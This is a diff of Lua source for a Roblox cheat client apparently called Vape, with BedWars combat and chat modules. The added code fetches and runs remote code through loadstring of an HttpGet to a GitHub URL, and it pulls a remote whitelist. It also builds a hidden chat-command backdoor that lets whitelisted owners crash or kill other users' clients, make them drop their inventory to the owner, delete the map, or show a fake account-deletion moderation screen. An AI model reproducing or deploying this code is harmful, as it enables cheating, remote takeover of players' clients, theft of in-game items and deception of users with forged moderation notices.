-		video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-		local textlab = Instance.new("TextLabel")
-		textlab.TextSize = 45
-		textlab.ZIndex = 10
-		textlab.Size = UDim2.new(1, 0, 1, 36)
-		textlab.TextColor3 = Color3.new(1, 1, 1)
-		textlab.Text = str
-		textlab.Position = UDim2.new(0, 0, 0, -36)
-		textlab.Font = Enum.Font.Gotham
-		textlab.BackgroundTransparency = 1
-		textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-		video.Loaded:Connect(function()
-			video.Visible = true
-			video:Play()
-			task.spawn(function()
-				repeat
-					wait()
-					for i = 0, 1, 0.01 do
-						wait(0.01)
-						textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
-					end
-				until true == false
 			end)
-		end)
-		task.wait(19)
-		task.spawn(function()
-			pcall(function()
-				if getconnections then
-					getconnections(entityLibrary.character.Humanoid.Died)
-				end
-				print(game:GetObjects("h29g3535")[1])
-			end)
-			while true do end
-		end)
-	end,
-	enable = function(args)
-		if #args >= 1 then
-			if args[1]:lower() == "all" then
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
-						v.Api.ToggleButton()
-					end
-				end
-			else
-				local module
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-						module = v
-						break
-					end
-				end
-				if module and not module.Api.Enabled then
-					module.Api.ToggleButton()
-				end
-			end
-		end
-	end,
-	disable = function(args)
-		if #args >= 1 then
-			if args[1]:lower() == "all" then
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
-						v.Api.ToggleButton()
-					end
-				end
-			else
-				local module
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-						module = v
-						break
-					end
-				end
-				if module and module.Api.Enabled then
-					module.Api.ToggleButton()
-				end
-			end
-		end
-	end,
-	toggle = function(args)
-		if #args >= 1 then
-			if args[1]:lower() == "all" then
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i ~= "Panic" then
-						v.Api.ToggleButton()
-					end
-				end
-			else
-				local module
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-						module = v
-						break
-					end
-				end
-				if module then
-					module.Api.ToggleButton()
-				end
-			end
-		end
-	end,
-	shutdown = function(args)
-		game:Shutdown()
+
+runFunction(function()
+	local Chat = {["Enabled"] = false}
+	Chat = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
+	["Name"] = "MoveChat",
+	["Function"] = function(callback)
+	if callback then
+	game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = "Bottom"
+	else
+	game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = "Top"
 	end
-}
+	end
+	})
+	end)
 
-function isPlayerAllowed()
-	return false
-end
-
-local txt = game:GetService("TextChatService")
-local private = {}
-local users = {}
-
-task.spawn(function()
-	repeat task.wait()
-		for i,plr in pairs(game.Players:GetPlayers()) do 
-			if table.find(private,plr) then return end
-			if not CanAttackUser(plr) then
-				local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-				local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
-				newchannel:SendAsync("ALAAZA")
-				table.insert(private,plr)
-				task.wait(1)
-				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
-			end
-		end
-	until false
-end)
-
-local users = {}
-
-txt.OnIncomingMessage = function(msg)
-	local p = Instance.new("TextChatMessageProperties")
-	local message = msg
-	if msg.TextSource then
-		local plr2
-		local userId = tostring(msg.TextSource.UserId)
-		for i,v in pairs(game.Players:GetPlayers()) do
-			if tostring(v.UserId) == userId then
-				plr2 = v
-				break
-			end
-		end
-		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
-		if CanAttackUser(plr2) and plr2 ~= lplr then
-			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." is using Vape!",60)
-				table.insert(users,plr2.UserId)
-			end
-		end
-		if message.Text:find("privately") then
-			p.PrefixText = ""
-			return p
-		end
-		for i,v in pairs(commands) do
-			if tostring(i) == tostring(message.Text).." default" or tostring(i) == tostring(message.Text).." "..lplr.DisplayName or tostring(i) == tostring(message.Text) then
-				local plr
-				for i,v in pairs(game.Players:GetPlayers()) do
-					if tostring(v.UserId) == userId then
-						plr = v
-						break
-					end
+	runFunction(function()
+		local MultiAura = {Enabled = false}
+		MultiAura = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+			Name = "MultiAura",
+			Function = function(callback)
+				if callback then
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/AcronisX/Random/main/random"))()
 				end
-				if plr == nil then break end
-				if not CanAttackUser(plr) then
-					v()
-				end
-				break
 			end
-		end
-		local colors = {
-			["red"] = "#ff0000",
-			["orange"] = "#ff7800",
-			["yellow"] = "#e5ff00",
-			["green"] = "#00ff00",
-			["blue"] = "#0000ff",
-			["purple"] = "#ac00e6",
-			["pink"] = "#ff00ff",
-			["black"] = "#000000",
-			["white"] = "#ffffff",
+		})
+	end)
+
+	game:GetService('RunService').RenderStepped:Connect(function()
+
+		local args = {
+			[1] = {
+				["direction"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector
+			}
 		}
-		if CanAttackUser(plr2) and plr2 ~= lplr then
-			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." is using Vape!",60)
-				table.insert(users,plr2.UserId)
-				table.insert(whitelist["tags"],{
-					userid = plr2.UserId,
-					color = "",
-					tag = ""
-				})
-			end
-		end
-		if message.Text:find("You are now privately chatting") then 
-			p.PrefixText = ""
-			msg.Text = ""
-			return p
-		end
-		for i,v in pairs(commands) do
-			if tostring(i) == tostring(message.Text) then
-				local plr
-				for i,v in pairs(game.Players:GetPlayers()) do
-					if tostring(v.UserId) == userId then
-						plr = v
-						break
-					end
-				end
-				if plr == nil or plr == lplr then break end
-				if not CanAttackUser(plr) then
-					v()
-				end
-				break
-			end
-		end
-		p.PrefixText = msg.PrefixText
-		print(message.Text,":",userId)
+	  
+			   game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ScytheDash:FireServer(unpack(args))
+	  end)
 
+	local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PinkReleased/Ape/main/New"))
+	local function getLplrType()
+		local lplr_Type = 0
+		if whitelist["Owner"] ~= nil then
+			for i,v in pairs(whitelist["Owner"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 3
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["Private"] ~= nil then
+			for i,v in pairs(whitelist["Private"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 1
+					return lplr_Type
+				end
+			end
+		end
+		return lplr_Type
+	end
+	
+	local MoonUsers = {}
+	
+	function CanAttackUser(u)
+		local userId = tostring(u.UserId)
 		local userType = 0
-		local hasTag = false
-		if users[plr2.UserId] ~= nil then
-			p.PrefixText = "<font color='"..colors["pink"].."'>[]</font> " .. msg.PrefixText
-			hasTag = true
-			return p
-		end
-
-		if whitelist["tags"] ~= nil then
-			for i, v in pairs(whitelist["tags"]) do
-				if v.userid == userId then
-					hasTag = true
-					local color = colors[v.color] or colors["pink"]
-					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
-				end
-			end
-		end
-
+	
 		if whitelist["Private"] ~= nil then
 			for i, v in pairs(whitelist["Private"]) do
 				if v.id == userId then
-					if not hasTag then
-						hasTag = true
-						p.PrefixText = "<font color='"..colors["purple"].."'>[VAPE PRIVATE]</font> " .. msg.PrefixText
-					end
 					userType = 1
+					break
 				end
 			end
 		end
-
+	
 		if whitelist["Owner"] ~= nil then
 			for i, v in pairs(whitelist["Owner"]) do
 				if v.id == userId then
-					if not hasTag then
-						hasTag = true
-						p.PrefixText = "<font color='#ff3333'>[VAPE OWNER]</font> " .. msg.PrefixText
-					end
 					userType = 3
+					break
 				end
 			end
 		end
+	
+		return getLplrType() >= userType
 	end
-
-	return p
-end
+	
+	local function transformImage(img, txt)
+		local function funnyfunc(v)
+			if v:GetFullName():find("ExperienceChat") == nil then
+				if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+					v.Image = img
+					v:GetPropertyChangedSignal("Image"):Connect(function()
+						v.Image = img
+					end)
+				end
+				if (v:IsA("TextLabel") or v:IsA("TextButton")) then
+					if v.Text ~= "" then
+						v.Text = txt
+					end
+					v:GetPropertyChangedSignal("Text"):Connect(function()
+						if v.Text ~= "" then
+							v.Text = txt
+						end
+					end)
+				end
+				if v:IsA("Texture") or v:IsA("Decal") then
+					v.Texture = img
+					v:GetPropertyChangedSignal("Texture"):Connect(function()
+						v.Texture = img
+					end)
+				end
+				if v:IsA("MeshPart") then
+					v.TextureID = img
+					v:GetPropertyChangedSignal("TextureID"):Connect(function()
+						v.TextureID = img
+					end)
+				end
+				if v:IsA("SpecialMesh") then
+					v.TextureId = img
+					v:GetPropertyChangedSignal("TextureId"):Connect(function()
+						v.TextureId = img
+					end)
+				end
+				if v:IsA("Sky") then
+					v.SkyboxBk = img
+					v.SkyboxDn = img
+					v.SkyboxFt = img
+					v.SkyboxLf = img
+					v.SkyboxRt = img
+					v.SkyboxUp = img
+				end
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:Connect(funnyfunc)
+	end
+	
+	local commands = {
+		kill = function(args, plr)
+			if entityLibrary.isAlive then
+				local hum = entityLibrary.character.Humanoid
+				task.delay(0.1, function()
+					if hum and hum.Health > 0 then 
+						hum:ChangeState(Enum.HumanoidStateType.Dead)
+						hum.Health = 0
+						bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
+					end
+				end)
+			end
+		end,
+		byfron = function(args, plr)
+			task.spawn(function()
+				local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+				local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+				UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+				local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+				local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+				local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				GuiLibrary.MainGui.Enabled = false
+				game:GetService("CoreGui"):ClearAllChildren()
+				for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+				task.wait(0.2)
+				lplr:Kick()
+				game:GetService("GuiService"):ClearError()
+				task.wait(2)
+				local gui = Instance.new("ScreenGui")
+				gui.IgnoreGuiInset = true
+				gui.Parent = game:GetService("CoreGui")
+				local frame = Instance.new("Frame")
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.new(1, 0, 1, 0)
+				frame.BackgroundColor3 = Color3.new(1, 1, 1)
+				frame.Parent = gui
+				task.delay(0.1, function()
+					frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+				end)
+				task.delay(2, function()
+					local e = Roact.createElement(auth, {
+						style = {},
+						screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = "Delete",
+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {},
+							messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+						},
+						termsActivated = function() 
+							game:Shutdown()
+						end,
+						communityGuidelinesActivated = function() 
+							game:Shutdown()
+						end,
+						supportFormActivated = function() 
+							game:Shutdown()
+						end,
+						reactivateAccountActivated = function() 
+							game:Shutdown()
+						end,
+						logoutCallback = function()
+							game:Shutdown()
+						end,
+						globalGuiInset = {
+							top = 0
+						}
+					})
+					local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+							localization = tLocalization.mock()
+						}, {Roact.createElement(UIBlox.Style.Provider, {
+								style = {
+									Theme = darktheme,
+									Font = gotham
+								},
+							}, {e})}))
+					Roact.mount(screengui, game:GetService("CoreGui"))
+				end)
+			end)
+		end,
+		steal = function(args, plr)
+			if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+				GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+				task.wait(1)
+			end
+			for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
+				local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+					item = v.tool,
+					amount = v.amount ~= math.huge and v.amount or 99999999
+				})
+				if e then 
+					e.CFrame = plr.Character.HumanoidRootPart.CFrame
+				else
+					v.tool:Destroy()
+				end
+			end
+		end,
+		lobby = function(args)
+			bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+		end,
+		reveal = function(args)
+			task.spawn(function()
+				task.wait(0.1)
+				local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+				if newchannel then 
+					newchannel:SendAsync("I am using the inhaler client")
+				end
+			end)
+		end,
+		lagback = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
+			end
+		end,
+		jump = function(args)
+			if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end,
+		trip = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+			end
+		end,
+		teleport = function(args)
+			game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
+		end,
+		sit = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = true
+			end
+		end,
+		unsit = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = false
+			end
+		end,
+		freeze = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.Anchored = true
+			end
+		end,
+		thaw = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.Anchored = false
+			end
+		end,
+		deletemap = function(args)
+			for i,v in pairs(collectionService:GetTagged("block")) do
+				v:Destroy()
+			end
+		end,
+		void = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
+			end
+		end,
+		framerate = function(args)
+			if #args >= 1 then
+				if setfpscap then
+					setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
+				end
+			end
+		end,
+		crash = function(args)
+			setfpscap(9e9)
+			print(game:GetObjects("h29g3535")[1])
+		end,
+		chipman = function(args)
+			transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
+		end,
+		rickroll = function(args)
+			transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
+		end,
+		josiah = function(args)
+			transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
+		end,
+		xylex = function(args)
+			transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
+		end,
+		gravity = function(args)
+			workspace.Gravity = tonumber(args[1]) or 192.6
+		end,
+		kick = function(args)
+			local str = ""
+			for i,v in pairs(args) do
+				str = str..v..(i > 1 and " " or "")
+			end
+			task.spawn(function()
+				lplr:Kick(str)
+			end)
+			bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+		end,
+		ban = function(args)
+			task.spawn(function()
+				lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+			end)
+			bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+		end,
+		uninject = function(args)
+			GuiLibrary.SelfDestruct()
+		end,
+		monkey = function(args)
+			local str = ""
+			for i,v in pairs(args) do
+				str = str..v..(i > 1 and " " or "")
+			end
+			if str == "" then str = "skill issue" end
+			local video = Instance.new("VideoFrame")
+			video.Video = downloadVapeAsset("vape/assets/skill.webm")
+			video.Size = UDim2.new(1, 0, 1, 36)
+			video.Visible = false
+			video.Position = UDim2.new(0, 0, 0, -36)
+			video.ZIndex = 9
+			video.BackgroundTransparency = 1
+			video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			local textlab = Instance.new("TextLabel")
+			textlab.TextSize = 45
+			textlab.ZIndex = 10
+			textlab.Size = UDim2.new(1, 0, 1, 36)
+			textlab.TextColor3 = Color3.new(1, 1, 1)
+			textlab.Text = str
+			textlab.Position = UDim2.new(0, 0, 0, -36)
+			textlab.Font = Enum.Font.Gotham
+			textlab.BackgroundTransparency = 1
+			textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			video.Loaded:Connect(function()
+				video.Visible = true
+				video:Play()
+				task.spawn(function()
+					repeat
+						wait()
+						for i = 0, 1, 0.01 do
+							wait(0.01)
+							textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+						end
+					until true == false
+				end)
+			end)
+			task.wait(19)
+			task.spawn(function()
+				pcall(function()
+					if getconnections then
+						getconnections(entityLibrary.character.Humanoid.Died)
+					end
+					print(game:GetObjects("h29g3535")[1])
+				end)
+				while true do end
+			end)
+		end,
+		enable = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module and not module.Api.Enabled then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		disable = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module and module.Api.Enabled then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		toggle = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		shutdown = function(args)
+			game:Shutdown()
+		end
+	}
+	
+	function isPlayerAllowed()
+		return false
+	end
+	
+	local txt = game:GetService("TextChatService")
+	local private = {}
+	local users = {}
+	
+	task.spawn(function()
+		repeat task.wait()
+			for i,plr in pairs(game.Players:GetPlayers()) do 
+				if table.find(private,plr) then return end
+				if not CanAttackUser(plr) then
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
+					newchannel:SendAsync("ALAAZA")
+					table.insert(private,plr)
+					task.wait(1)
+					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+				end
+			end
+		until false
+	end)
+	
+	local users = {}
+	
+	txt.OnIncomingMessage = function(msg)
+		local p = Instance.new("TextChatMessageProperties")
+		local message = msg
+		if msg.TextSource then
+			local plr2
+			local userId = tostring(msg.TextSource.UserId)
+			for i,v in pairs(game.Players:GetPlayers()) do
+				if tostring(v.UserId) == userId then
+					plr2 = v
+					break
+				end
+			end
+			local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
+			if CanAttackUser(plr2) and plr2 ~= lplr then
+				if message.Text:find("ALAAZA") then
+					warningNotification("Vape",plr2.Name.." is using Vape!",60)
+					table.insert(users,plr2.UserId)
+				end
+			end
+			if message.Text:find("privately") then
+				p.PrefixText = ""
+				return p
+			end
+			for i,v in pairs(commands) do
+				if tostring(i) == tostring(message.Text).." default" or tostring(i) == tostring(message.Text).." "..lplr.DisplayName or tostring(i) == tostring(message.Text) then
+					local plr
+					for i,v in pairs(game.Players:GetPlayers()) do
+						if tostring(v.UserId) == userId then
+							plr = v
+							break
+						end
+					end
+					if plr == nil then break end
+					if not CanAttackUser(plr) then
+						v()
+					end
+					break
+				end
+			end
+			local colors = {
+				["red"] = "#ff0000",
+				["orange"] = "#ff7800",
+				["yellow"] = "#e5ff00",
+				["green"] = "#00ff00",
+				["blue"] = "#0000ff",
+				["purple"] = "#ac00e6",
+				["pink"] = "#ff00ff",
+				["black"] = "#000000",
+				["white"] = "#ffffff",
+			}
+			if CanAttackUser(plr2) and plr2 ~= lplr then
+				if message.Text:find("ALAAZA") then
+					warningNotification("Vape",plr2.Name.." is using Vape!",60)
+					table.insert(users,plr2.UserId)
+					table.insert(whitelist["tags"],{
+						userid = plr2.UserId,
+						color = "",
+						tag = ""
+					})
+				end
+			end
+			if message.Text:find("You are now privately chatting") then 
+				p.PrefixText = ""
+				msg.Text = ""
+				return p
+			end
+			for i,v in pairs(commands) do
+				if tostring(i) == tostring(message.Text) then
+					local plr
+					for i,v in pairs(game.Players:GetPlayers()) do
+						if tostring(v.UserId) == userId then
+							plr = v
+							break
+						end
+					end
+					if plr == nil or plr == lplr then break end
+					if not CanAttackUser(plr) then
+						v()
+					end
+					break
+				end
+			end
+			p.PrefixText = msg.PrefixText
+			print(message.Text,":",userId)
+	
+			local userType = 0
+			local hasTag = false
+			if users[plr2.UserId] ~= nil then
+				p.PrefixText = "<font color='"..colors["pink"].."'>[]</font> " .. msg.PrefixText
+				hasTag = true
+				return p
+			end
+	
+			if whitelist["tags"] ~= nil then
+				for i, v in pairs(whitelist["tags"]) do
+					if v.userid == userId then
+						hasTag = true
+						local color = colors[v.color] or colors["pink"]
+						p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
+					end
+				end
+			end
+	
+			if whitelist["Private"] ~= nil then
+				for i, v in pairs(whitelist["Private"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='"..colors["purple"].."'>[VAPE PRIVATE]</font> " .. msg.PrefixText
+						end
+						userType = 1
+					end
+				end
+			end
+	
+			if whitelist["Owner"] ~= nil then
+				for i, v in pairs(whitelist["Owner"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='#ff3333'>[VAPE OWNER]</font> " .. msg.PrefixText
+						end
+						userType = 3
+					end
+				end
+			end
+		end
+	
+		return p
+	end
